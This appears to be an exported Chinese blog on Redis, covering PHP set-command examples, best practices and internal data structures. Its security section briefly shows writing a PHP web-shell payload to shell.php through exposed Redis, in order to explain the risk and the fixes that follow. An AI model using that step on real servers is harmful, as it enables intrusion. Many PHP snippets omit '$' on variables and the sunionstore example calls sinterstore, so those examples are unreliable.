```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
var_dump(redis->sadd('test','111'));   //结果：bool(true)  
var_dump(redis->sadd('test','333'));   //结果：bool(true)  
print_r(redis->sort('test')); //结果：Array ( [0] => 111 [1] => 333 )  
?>
```

19，sremove
描述：删除Key中指定的value值
参数：key member
返回值：true or false
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->sadd('test','111');  
redis->sadd('test','333');  
redis->sremove('test','111');  
print_r($redis->sort('test'));    //结果：Array ( [0] => 333 )  
?>
```

20,smove
描述：将Key1中的value移动到Key2中
参数：srcKey dstKey member
返回值：true or false
范例

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->delete('test1');  
redis->sadd('test','111');  
redis->sadd('test','333');  
redis->sadd('test1','222');  
redis->sadd('test1','444');  
redis->smove('test',"test1",'111');  
print_r(redis->sort('test1'));    //结果：Array ( [0] => 111 [1] => 222 [2] => 444 )  
?>
```

21，scontains
描述：检查集合中是否存在指定的值。
参数：key value
返回值：true or false
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->sadd('test','111');  
redis->sadd('test','112');  
redis->sadd('test','113');  
var_dump($redis->scontains('test', '111')); //结果：bool(true)  
?>
```

22,ssize
描述：返回集合中存储值的数量
参数：key
返回值：成功返回数组个数，失败0
范例：

```&lt;?php  
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->sadd('test','111');  
redis->sadd('test','112');  
echo redis->ssize('test');   //结果：2  
?>
```

23，spop
描述：随机移除并返回key中的一个值
参数：key
返回值：成功返回删除的值，失败false
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->sadd("test","111");  
redis->sadd("test","222");  
redis->sadd("test","333");  
var_dump($redis->spop("test"));  //结果：string(3) "333"  
?>
```

24,sinter
描述：返回一个所有指定键的交集。如果只指定一个键，那么这个命令生成这个集合的成员。如果不存在某个键，则返回FALSE。
参数：key1, key2, keyN
返回值：成功返回数组交集，失败false
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->sadd("test","111");  
redis->sadd("test","222");  
redis->sadd("test","333");  
redis->sadd("test1","111");  
redis->sadd("test1","444");  
var_dump($redis->sinter("test","test1"));  //结果：array(1) { [0]=> string(3) "111" }  
?>
```

25,sinterstore
描述：执行sInter命令并把结果储存到新建的变量中。
参数：
Key: dstkey, the key to store the diff into.
Keys: key1, key2… keyN. key1..keyN are intersected as in sInter.
返回值：成功返回，交集的个数，失败false
范例:

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->sadd("test","111");  
redis->sadd("test","222");  
redis->sadd("test","333");  
redis->sadd("test1","111");  
redis->sadd("test1","444");  
var_dump(redis->sinterstore('new',"test","test1"));  //结果：int(1)  
var_dump(redis->smembers('new'));  //结果:array(1) { [0]=> string(3) "111" }  
?>
```

26,sunion
描述：
返回一个所有指定键的并集
参数：
Keys: key1, key2, … , keyN
返回值：成功返回合并后的集，失败false
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->sadd("test","111");  
redis->sadd("test","222");  
redis->sadd("test","333");  
redis->sadd("test1","111");  
redis->sadd("test1","444");  
print_r($redis->sunion("test","test1"));  //结果：Array ( [0] => 111 [1] => 222 [2] => 333 [3] => 444 )  
?>
```

27,sunionstore
描述：执行sunion命令并把结果储存到新建的变量中。
参数：
Key: dstkey, the key to store the diff into.
Keys: key1, key2… keyN. key1..keyN are intersected as in sInter.
返回值：成功返回，交集的个数，失败false
范例:

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->sadd("test","111");  
redis->sadd("test","222");  
redis->sadd("test","333");  
redis->sadd("test1","111");  
redis->sadd("test1","444");  
var_dump(redis->sinterstore('new',"test","test1"));  //结果：int(4)  
print_r(redis->smembers('new'));  //结果:Array ( [0] => 111 [1] => 222 [2] => 333 [3] => 444 ) 
?>
```

28,sdiff
描述：返回第一个集合中存在并在其他所有集合中不存在的结果
参数：Keys: key1, key2, … , keyN: Any number of keys corresponding to sets in redis.
返回值：成功返回数组，失败false
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->sadd("test","111");  
redis->sadd("test","222");  
redis->sadd("test","333");  
redis->sadd("test1","111");  
redis->sadd("test1","444");  
print_r($redis->sdiff("test","test1"));  //结果：Array ( [0] => 222 [1] => 333 )  
?>
```

29,sdiffstore
描述：执行sdiff命令并把结果储存到新建的变量中。
参数：
Key: dstkey, the key to store the diff into.
Keys: key1, key2, … , keyN: Any number of keys corresponding to sets in redis
返回值：成功返回数字，失败false
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->sadd("test","111");  
redis->sadd("test","222");  
redis->sadd("test","333");  
redis->sadd("test1","111");  
redis->sadd("test1","444");  
var_dump(redis->sdiffstore('new',"test","test1"));  //结果：int(2)  
print_r(redis->smembers('new'));  //结果:Array ( [0] => 222 [1] => 333 )  
?>
```

30,smembers, sgetmembers
描述：
返回集合的内容
参数：Key: key
返回值：An array of elements, the contents of the set.
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->sadd("test","111");  
redis->sadd("test","222");  
print_r(redis->smembers('test'));  //结果:Array ( [0] => 111 [1] => 222 )  
?>
```

]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis使用技巧及最佳实践</title>
    <url>/2022/05/22/Redis/Redis%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E5%8F%8A%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[
# Redis最佳实践

## Redis键值设计

### 优雅的key结构

定义Key时, 最好遵循以下约定:

- 遵守基本格式: `[业务名称]:[数据名]:[数据id]`

  如 `login:user:10`

  优点在于可读性强, 避免key冲突, 方便管理

- 长度不超过44字节

  节省内存: 
  	key是string类型, 底层编码包括int、embstr和raw三种. 
  	embstr在小于44字节使用, 采用连续内存空间, 内存占用更少

  ![image-20220701135942117](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/27a1a51a847382b37a95c18587eaa462-7a01979.png)

  ![image-20220701135958999](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0578600495ee51611863d48252977699-ba38de2.png)

- 不使用特殊字符

### 拒绝BigKey

Redis中单个Key支持512M大小的数据存储, 但BigKey数据对系统性能有很大印象, 应尽量避免

![image-20220701143112476](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1a7127d877fee57d7d02477a5ef743fb-829b00a.png)

#### 危害:

- 网络阻塞

  对BigKey执行读请求时，少量的QPS就可能导致带宽使用率被占满，导致Redis实例，乃至所在物理机变慢

- 数据倾斜

  BigKey所在的Redis实例内存使用率远超其他实例，无法使数据分片的内存资源达到均衡

- Redis操作阻塞

  对元素较多的hash、list、zset等做运算会耗时较旧，使主线程被阻塞

- CPU压力

  对BigKey的数据序列化和反序列化会导致CPU的使用率飙升，影响Redis实例和本机其它应用

#### 判断BigKey

BigKey通常以Key的**大小**和Key中成员的**数量**来综合判定，例如：

- Key本身的数据量过大：一个String类型的Key，它的值为5 MB。

- Key中的成员数过多：一个ZSET类型的Key，它的成员数量为10,000个。

- Key中成员的数据量过大：一个Hash类型的Key，它的成员数量虽然只有1,000个但这些成员的Value（值）总大小为100 MB。

> 一般推荐, 单个key的value小于10KB. 对于集合类型的key，建议元素数量小于1000

#### 发现BigKey

- `redis-cli --bigkeys`

  利用redis-cli提供的`--bigkeys`参数，可以遍历分析所有key，并返回Key的整体统计信息与每个数据的Top1的big key

  ![image-20220701142913901](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/268a12b65e4f5cb9b3acca6b0b305426-a29ce0c.png)

-  **scan**扫描

  自己编程，利用`scan`扫描Redis中的所有key，利用`strlen`、`hlen`等命令判断key的长度（此处不建议使用`MEMORY USAGE`）

  ![image-20220701143155339](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/50ffa0aa9a3ad7a8c1f395b57c2dd8c0-6741471.png)

- **第三方工具**

  利用第三方工具，如 [Redis-](https://github.com/sripathikrishnan/redis-rdb-tools?spm=a2c4g.11186623.0.0.14073c9cldKVDv)[Rdb](https://github.com/sripathikrishnan/redis-rdb-tools?spm=a2c4g.11186623.0.0.14073c9cldKVDv)[-Tools](https://github.com/sripathikrishnan/redis-rdb-tools?spm=a2c4g.11186623.0.0.14073c9cldKVDv) 分析RDB快照文件，全面分析内存使用情况

- **网络监控**

  自定义工具，监控进出Redis的网络数据，超出预警值时主动告警

  ![image-20220701142452820](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/98ebed87c160d26266bf7fb1021d0046-927371b.png)

#### 处理BigKey

- 拆分

- 删除

  BigKey内存占用较多，即便时删除这样的key也需要耗费很长时间，导致Redis主线程阻塞，引发一系列问题。

  - version 3.0及以前

    如果是集合类型，则遍历BigKey的元素，先逐个删除子元素，最后删除BigKey

    ![image-20220701142305612](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/83fd634360cf4da8ca187b9d02046eb3-2092cea.png)

    ![image-20220701141940391](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/485d487a2bc7d8ccfa3b5d9137081e93-377ca8d.png)

  - version 4.0之后

    Redis在4.0后提供了异步删除的命令：unlink

    ![image-20220701142211509](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/951760d28e8a6a986aaaf535d54b6f0a-beb9a02.png)

    ![image-20220701142137813](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/785382a4cadf4ef7d660b7f8f67fcc98-b1a779f.png)

### 恰当的数据类型

1.存储用户信息, 存在三种方式:

- 方式一：json字符串

  | key    | value                       |
  | ------ | --------------------------- |
  | user:1 | {"name": "Jack", "age": 21} |

  **优点**：实现简单粗暴

  **缺点**：数据耦合，不够灵活

- 方式二：字段打散

  | key         | value |
  | ----------- | ----- |
  | user:1:name | Jack  |
  | user:1:age  | 21    |

  **优点**：可以灵活访问对象任意字段

  **缺点**：占用空间大、没办法做统一控制

- 方式三：hash (**适合**)

  | key    | field | value |
  | ------ | ----- | ----- |
  | user:1 | name  | Jack  |
  | user:1 | age   | 21    |

  **优点**：底层使用ziplist，空间占用小，可以灵活访问对象的任意字段

  **缺点**：代码相对复杂

2.hash类型的key，其中有100万对field和value，field是自增id，这个key存在什么问题？如何优化？

| Key     | field     | **value**   |
| ------- | --------- | ----------- |
|         | id:0      | value0      |
| somekey | .....     | .....       |
|         | id:999999 | value999999 |

- 存在的问题：

  ①hash的entry(field-value对)数量超过500时，会使用哈希表而不是ZipList，内存占用较多。

  ②可以通过`hash-max-ziplist-entries`配置entry上限。但是如果entry过多就会导致BigKey问题

- 处理方案:

  拆分为小的hash，将 `id / 100` 作为key， 将`id % 100` 作为field，这样每100个元素为一个Hash

  | Key   | field | **value** |
  | ----- | ----- | --------- |
  |       | id:00 | value0    |
  | key:0 | ..... | .....     |
  |       | id:99 | value99   |

  | Key   | field | **value** |
  | ----- | ----- | --------- |
  |       | id:00 | value0    |
  | key:1 | ..... | .....     |
  |       | id:99 | value99   |

  ...

  | Key      | field | **value** |
  | -------- | ----- | --------- |
  |          | id:00 | value0    |
  | key:9999 | ..... | .....     |
  |          | id:99 | value99   |

- 优点: 减少无用结构数据, 避免BigKey产生

### 设置合理的超时时间

## 批处理优化

对于大量数据的处理, 存在多次少量和少次多量两个方案, 由于网络传输耗时数量级高于命令执行耗时, 所以优先采用一次性执行多条命令的方案

### Redis命令

Redis提供了执行多个数据的命令, 批量查询/插入/修改, 如`mset` , `hmset`等, 可以**保证原子性**

但需要注意, 不要在一次批处理中传输太多命令，否则单次命令占用带宽过多，会导致网络阻塞

### Pipeline

MSET虽然可以批处理，但是却只能操作部分数据类型，因此如果有对复杂数据类型的批处理需要，建议使用Pipeline功能. 但**不保证多条命令的原子性** 

```php
$res = $redis->pipeline(function ($pipe) {
    $pipe->lPush('list', 'list_item1');
    $pipe->llen('list');
    $pipe->lRange('list', 0, -1)
})
```

### 集群下的批处理

如MSET或Pipeline这样的批处理需要在一次请求中携带多条命令，而此时如果Redis是一个集群(Cluster)，那批处理命令的多个key必须落在一个插槽中，否则就会导致执行失败。

![image-20220701155515097](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7af530b6c31185435b95360a11cc67ea-2fb2820.png)

|          | 串行命令                      | 串行slot                                                     | 并行slot                                                     | hash_tag                                               |
| -------- | ----------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------ |
| 实现思路 | for循环遍历，依次执行每个命令 | 在客户端计算每个key的slot，将slot一致分为一组，每组都利用Pipeline批处理。  串行执行各组命令 | 在客户端计算每个key的slot，将slot一致分为一组，每组都利用Pipeline批处理。  并行执行各组命令 | 将所有key设置相同的`hash_tag`，则所有key的slot一定相同 |
| 耗时     | N次网络耗时  + N次命令耗时    | m次网络耗时  + N次命令耗时  m  = key的slot个数               | 1次网络耗时  + N次命令耗时                                   | 1次网络耗时  + N次命令耗时                             |
| 优点     | 实现简单                      | 耗时较短                                                     | 耗时非常短                                                   | 耗时非常短、实现简单                                   |
| 缺点     | 耗时非常久                    | 实现稍复杂  slot越多，耗时越久                               | 实现复杂                                                     | 容易出现数据倾斜                                       |

`hash_tag`使用:

![image-20220701160111674](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/aae7cee3c664b79c4b3a987e5301a274-350b86a.png)

> 对键执行 crc16 算法, 再对 16384 取余，即可得到一个小于 16384 的数，该结果就是 slot编号

## 服务端优化

### 持久化配置

Redis的持久化虽然可以保证数据安全，但也会带来很多额外的开销，因此持久化请遵循下列建议：

- 用来做缓存的Redis实例尽量不要开启持久化功能

- 建议关闭RDB持久化功能，使用AOF持久化

- 利用脚本定期在slave节点做RDB，实现数据备份

- 设置合理的rewrite阈值，避免频繁的bgrewrite

- 配置no-appendfsync-on-rewrite = yes，禁止在rewrite期间做aof，避免因AOF引起的阻塞, 但需要注意可能造成期间数据丢失问题

部署有关建议：

- Redis实例的物理机要预留足够内存，应对fork和rewrite

- 单个Redis实例内存上限不要太大，例如4G或8G。可以加快fork的速度、减少主从同步、数据迁移压力

- 不要与CPU密集型应用部署在一起

- 不要与高硬盘负载应用一起部署。例如：数据库、消息队列

### 慢查询

**慢查询**：在Redis执行时耗时超过某个阈值的命令，称为慢查询。

```
慢查询的阈值可以通过配置指定：
lslowlog-log-slower-than：慢查询阈值，单位是微秒(μs)。默认是10000，建议1000

慢查询会被放入慢查询日志中，日志的长度有上限，可以通过配置指定：
lslowlog-max-len：慢查询日志（本质是一个队列）的长度。默认是128，建议1000
```

![image-20220701162647571](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b76e78a4690df8a18e4e18f3c4d2b079-7ad97d3.png)

查看慢查询日志列表：

- `slowlog len`：查询慢查询日志长度

- `slowlog get [n]`：读取n条慢查询日志

- `slowlog reset`：清空慢查询列表

  ![image-20220701163013117](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ccdf8adcbe476db342fb4dd9f379fd3c-2968d92.png)

### 命令及安全配置

Redis会绑定在0.0.0.0:6379，这样将会将Redis服务暴露到公网上，而Redis如果没有做身份认证，会出现严重的安全漏洞.

漏洞出现的核心的原因有以下几点：

- Redis未设置密码

- 利用了Redis的`config set`命令动态修改Redis配置

- 使用了Root账号权限启动Redis

#### 示例

```
(echo -e "  "; cat pass.txt; echo -e "  ") > pass_e.txt
或者
echo "\r\n\r\n <?php 一句话 \r\n\r\n" > shell.php
```

![image-20220701163543128](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/6787929563f9b90592e8bc0e93cbd0a3-c05f69b.png)

#### 建议

为了避免这样的漏洞，这里给出一些建议：

- Redis一定要设置密码

  ![image-20220701164358266](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bf38cb28456ce036c4a752e8ec2eb2f8-dfeb2f6.png)

- 禁止线上使用下面命令：`keys`、`flushall`、`flushdb`、`config set`等命令。可以利用`rename-command`禁用。

  ![image-20220701164256070](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c38124db99f752ccd7b35c17be3cf2c9-90f67fe.png)

- bind：限制网卡，禁止外网网卡访问

- 开启防火墙

- 不要使用Root账户启动Redis

- 尽量不使用默认的端口

### 内存配置

当Redis内存不足时，可能导致Key频繁被删除、响应时间变长、QPS不稳定等问题。当内存使用率达到90%以上时就需要我们警惕，并快速定位到内存占用的原因。

#### 内存占用来源

| 内存占用   | 说明                                                         |
| ---------- | ------------------------------------------------------------ |
| 数据内存   | 是Redis最主要的部分，存储Redis的键值信息。主要问题是**BigKey**问题、**内存碎片**问题 |
| 进程内存   | Redis主进程本身运⾏肯定需要占⽤内存，如代码、常量池等等；这部分内存⼤约⼏兆，在⼤多数⽣产环境中与Redis数据占⽤的内存相⽐可以忽略 |
| 缓冲区内存 | 一般包括**客户端缓冲区**、**AOF缓冲区**、**复制缓冲区**等。客户端缓冲区又包括**输入缓冲区**和**输出缓冲区**两种。这部分内存占用波动较大，不当使用BigKey，可能导致内存溢出 |

> 内存碎片: Redis内部内存划分产生, 如10字节的数据在8字节与16字节期间, 故为其分配16字节数据, 多出来的6字节为内存碎片, 可以通过重新启动Redis服务处理

#### 查看内存状态

Redis提供了一些命令，可以查看到Redis目前的内存分配状态：

- **info memory ** 

  ![image-20220701200129343](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7d18f460b3d27870c262dcbca0780f0b-7f33f79.png)

  ![image-20220701195822913](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a99fc92ee94c1c17e2205cbc83c03001-20412e3.png)

- **memory [xxx]** 

  ![image-20220701200229761](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/af97f9c640ea0ed9fc49230698f50fa8-d1fe51b.png)

  ![image-20220701200205530](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0b1252922311905023d8d75e8b461182-1f3d897.png)

  ```
  # memory stats 结果解析
   1) "peak.allocated" 	// Redis进程启动以来消耗内存的峰值
   2) (integer) 945048
   3) "total.allocated"	// Redis使用分配器分配的总字节数, 即当前的总内存使用量
   4) (integer) 885240
   5) "startup.allocated"	// Redis启动时消耗的初始内存量
   6) (integer) 801232
   7) "replication.backlog"	// 复制积压缓冲区的大小
   8) (integer) 0
   9) "clients.slaves"	// 主从复制中其他所有从节点的读写缓冲区大小
  10) (integer) 0
  11) "clients.normal"	// 除从节点外, 所有其他普通客户端的读写缓冲区大小
  12) (integer) 41040
  13) "aof.buffer"		// AOF持久化使用的缓存和AOF重写时产生的缓存
  14) (integer) 0
  15) "lua.caches"		// lua脚本执行缓存
  16) (integer) 0
  17) "db.0"				// 当前业务数据库
  18) 1) "overhead.hashtable.main"	//当前数据库的hash链表开销内存综合, 即元数据内存
      2) (integer) 152
      3) "overhead.hashtable.expires"	// 用于存储可以的过期时间消耗的内存
      4) (integer) 32
  19) "overhead.total"	// 总开销 
  20) (integer) 842456
  21) "keys.count"		// Redis实例中Key的数量
  22) (integer) 3
  23) "keys.bytes-per-key"	// Redis实例中每个Key的平均大小
  24) (integer) 28002
  25) "dataset.bytes"		// 纯业务数据占用的内存大小
  26) (integer) 42784
  27) "dataset.percentage"	// 纯业务数据占用的内存比例
  28) "50.928482055664062"
  29) "peak.percentage"	// 当前总内存与历史峰值的比例
  30) "93.671432495117188"
  ...
  49) "fragmentation"		// 内存碎片率
  50) "6.1035556793212891"
  51) "fragmentation.bytes"
  52) (integer) 4308544
  
  ```

#### 内存缓冲区配置

内存缓冲区常见的有三种：

- **复制缓冲区**：主从复制的`repl_backlog_buf`，如果太小可能导致频繁的全量复制，影响性能。通过`repl-backlog-size`来设置，默认1mb

  ![image-20220701201833474](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8e104a27438e6251fade33416b6843bd-48cc4b3.png)

- **AOF缓冲区**：AOF刷盘之前的缓存区域，AOF执行`bgrewriteaof`的缓冲区。无法设置容量上限

- **客户端缓冲区：**分为输入缓冲区和输出缓冲区，输入缓冲区最大1G且不能设置。输出缓冲区可以设

  ![image-20220701201801038](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/721bd13eabea7421680cdfd619e4007c-0ff3fd2.png)

  ![image-20220701201920092](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0c680b26e540337ac9e18cc1d959eb7b-c83f01e.png)

  > 普通客户端无限制缓冲区, 可以通过限制BigKey, 增加服务带宽, 修复对应业务逻辑

#### 定位请求客户端

可以通过以下命令定位缓存溢出问题的客户端

- **info clients** 

  ![image-20220701202351824](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/618cc0850436284b028330e15a19bad6-666ea01.png)

- **client list** 

  ![image-20220701202441793](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d8f882ab9a3c6615ffdaedd0ccb45e80-078c05c.png)



## 集群最佳实践

集群虽然具备高可用特性，能实现自动故障恢复，但是如果使用不当，也会存在一些问题：

- 集群完整性问题

  在Redis的默认配置中，如果发现任意一个插槽不可用，则整个集群都会**停止**对外服务：

  ![image-20220701203621904](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5a9bd61814c8458a2005d90880d2ee63-5a52552.png)

  为了保证高**可用特性**，这里建议将 `cluster-require-full-coverage`配置为`no`

- 集群带宽问题

  集群节点之间会不断的互相Ping来确定集群中其它节点的状态。每次Ping携带的信息至少包括：插槽信息和集群状态信息

  集群中节点越多，集群状态信息数据量也越大，10个节点的相关信息可能达到1kb，此时每次集群互通需要的带宽会非常高。

  **解决途径**：

  ①避免大集群，集群节点数不要太多，最好少于1000，如果业务庞大，则建立多个集群。

  ②避免在单个物理机中运行太多Redis实例

  配置合适的`cluster-node-timeout`值

- 数据倾斜问题

  出现BigKey或批处理时使用`hash_tag` , 可能会造成数据集中于某个节点中

- 客户端性能问题

  客户端在处理集群时, 执行命令前必须要处理插槽的选择等问题, 会造成一定的性能损耗

- 命令的集群兼容性问题

  批处理命令不能直接向集群中执行, 因为数据可能需要落到不同的slot, 需要客户端自行处理

- lua和事务问题

  类型与批处理问题

#### 集群还是主从

单体Redis（主从Redis）已经能达到万级别的QPS，并且也具备很强的高可用特性。如果主从能满足业务需求的情况下，尽量不搭建Redis集群。]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis原理解析</title>
    <url>/2022/05/22/Redis/Redis%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[
# Redis原理解析

## 数据结构

### 动态字符串SDS

#### SDS简介

Redis中保存的Key是字符串, value往往是字符串或者字符串的集合. 可见字符串是Redis中最常用的一种数据结构

不过Redis没有直接使用C语言中的字符串，因为C语言字符串存在很多问题：

- 获取字符串长度的需要通过运算, 循环加计数器直到找到结尾标识符

- 非二进制安全, 不可以存在结尾特殊字符 `\0` 

- 不可修改, 保存在常量中

  ![image-20220702023422666](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/69f6edd95cacd1c4a0ca4815a321dbac-aaf255e.png)

Redis构建了一种新的字符串结构，称为**简单动态字符串**（**S**imple **D**ynamic **S**tring），简称**SDS**。

例如，我们执行命令：

```properties
127.0.0.1:6379> set name ni9ne
OK
```

那么Redis将在底层创建两个SDS，其中一个是包含`name`的SDS，另一个是包含`ni9ne`的SDS。

#### 底层实现

Redis是C语言实现的，其中SDS是一个结构体，源码如下

![image-20220702024023424](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/fbd991e9cd61aaa86030ca473e35b4d0-348f2d4.png)

> Redis提供了不同位的数据结构实现, 可存储 2^5 / 2^8 / 2^16 / 2^32 / 2^64 大小的字符串

例如，一个包含字符串`name`的sds结构如下：

```
 ------------------------------------------------
| len:4 | alloc:4 | flags:1 | n | a | m | e | \0 |
 ------------------------------------------------
\         header            /\      数据         /
 - - - - - - - - - - - - - -  - - - - - - - - - 
```

#### SDS扩容

SDS之所以叫做**动态字符串**，是因为它具备**动态扩容**的能力，例如给上面的SDS数据添加字符串 : `ofyou` 

首先会申请新内存空间：

- 如果新字符串小于1M，则新空间为 `扩展后字符串长度的两倍+1`；

- 如果新字符串大于1M，则新空间为 `扩展后字符串长度+1M+1`。称为**内存预分配**。

  > 避免用户态与内核态频繁切换, 预先分配内存空间

**扩容后结构如下:** 

```
 ------------------------------------------------------------------------------------
| len:9 | alloc:18| flags:1 | n | a | m | e | o | f | y | o | u | \0 | | | | | | | | |
 ------------------------------------------------------------------------------------
\         header            /\                     数据                              /
 - - - - - - - - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - 
```

**优点:** 

- 获取字符串长度的时间复杂度为O(1)

- 支持动态扩容

- 减少内存分配次数

- 二进制安全

### IntSet

#### IntSet简介

IntSet是Redis中set集合的一种实现方式，基于整数数组来实现，并且具备长度可变、有序等特征。

结构如下：

![image-20220702033837718](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3ddf52c51c24369f788f860030e7da81-305679b.png)

其中的encoding包含三种模式，表示存储的整数大小不同：

![image-20220702033940663](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b212adf4e1c29d33a2fc6092e6fc54be-18118b8.png)

为了方便查找，Redis会将intset中所有的整数按照升序依次保存在contents数组中，结构如图：

![image-20220702034513176](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/37f675c0d3ffa076a5592443367f0450-eafde3f.png)

```
现在，数组中每个数字都在int16_t的范围内，因此采用的编码方式是INTSET_ENC_INT16，每部分占用的字节大小为:
- encoding：4字节
- length：4字节
- contents：2字节 * 3  = 6字节
```

#### IntSet升级

有一个`intset`，元素为`{5,10，20}`，采用的编码是`INTSET_ENC_INT16`，则每个整数占2字节. 

向该其中添加一个数字：`50000`，这个数字超出了`int16_t`的范围，intset会自动**升级**编码方式到合适的大小。

流程如下：

![image-193507020329160000030](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/de01adf9e0bef045278bf465d021d481-a974fc5.gif)

①升级编码为`INTSET_ENC_INT32`, 每个整数占4字节，并按照新的编码方式及元素个数扩容数组

②**倒序**依次将数组中的元素拷贝到扩容后的正确位置 (避免顺序覆盖原有数据)

③将待添加的元素放入数组末尾

④最后，将`intset`的`encoding`属性改为`INTSET_ENC_INT32`，将`length`属性改为4

![image-20220702035044685](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/60b78fc4e014fb8d63d19f89e9f8a09e-cc93f1a.png)

#### IntSet新增流程

##### 新增动作:

![image-20220702142044022](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bbf9d4f45a0226651e126b0d4cf83921-43caee5.png)

##### 升级动作:

![image-20220702142248229](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5c2fff360bcd5a3cdaa52e7b51e17f04-ff9633d.png)

##### 查找当前值角标:

![image-20220702142513749](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8813407661098e92eac6fd735d18b102-93e5d0f.png)

```c
/* Search for the position of "value". Return 1 when the value was found and
 * sets "pos" to the position of the value within the intset. Return 0 when
 * the value is not present in the intset and sets "pos" to the position
 * where "value" can be inserted. */
static uint8_t intsetSearch(intset *is, int64_t value, uint32_t *pos) {
    // 初始化二分查找的 min , max , mid
    int min = 0, max = intrev32ifbe(is->length)-1, mid = -1;
    int64_t cur = -1;	// mid对应的值

    /* 若数组为空则不需要找了, 返回0 */
    if (intrev32ifbe(is->length) == 0) {
        if (pos) *pos = 0;
        return 0;
    } else {
        /* 数组不为空, 判断value是否大于最大值, 小于最小值 */
        if (value > _intsetGet(is,max)) {	// 大于最大值, 插入队尾
            if (pos) *pos = intrev32ifbe(is->length);
            return 0;
        } else if (value < _intsetGet(is,0)) {	// 小于最小值, 插入队首
            if (pos) *pos = 0;
            return 0;
        }
    }
	// 二分查找
    while(max >= min) {
        mid = ((unsigned int)min + (unsigned int)max) >> 1;
        cur = _intsetGet(is,mid);
        if (value > cur) {
            min = mid+1;
        } else if (value < cur) {
            max = mid-1;
        } else {
            break;
        }
    }
    if (value == cur) {
        if (pos) *pos = mid;
        return 1;
    } else {
        if (pos) *pos = min;
        return 0;
    }
}
```

#### IntSet特点

Intset可以看做是特殊的整数数组，具备以下特点：

- Redis会确保Intset中的元素唯一、有序

- 具备类型升级机制，可以节省内存空间

- 底层采用二分查找方式来查询

> 存储少量数据, 在数据量不多的情况下使用

### Dict

#### Dict简介

Redis是一个键值型（Key-Value Pair）的数据库，我们可以根据键实现快速的增删改查。而**键与值的映射关系**正是通过Dict来实现的。

Dict由三部分组成，分别是：哈希表（DictHashTable）、哈希节点（DictEntry）、字典（Dict）

- 哈希表（DictHashTable）

  ![image-20220702104442031](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/57b99fe9ac796be76edc9a91eafd9675-217bb7d.png)

- 哈希节点（DictEntry）

  ![image-20220702104607302](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/82e31ed742e0d119352b7b1eb4351d48-e7c70a8.png)

- 字典（Dict）

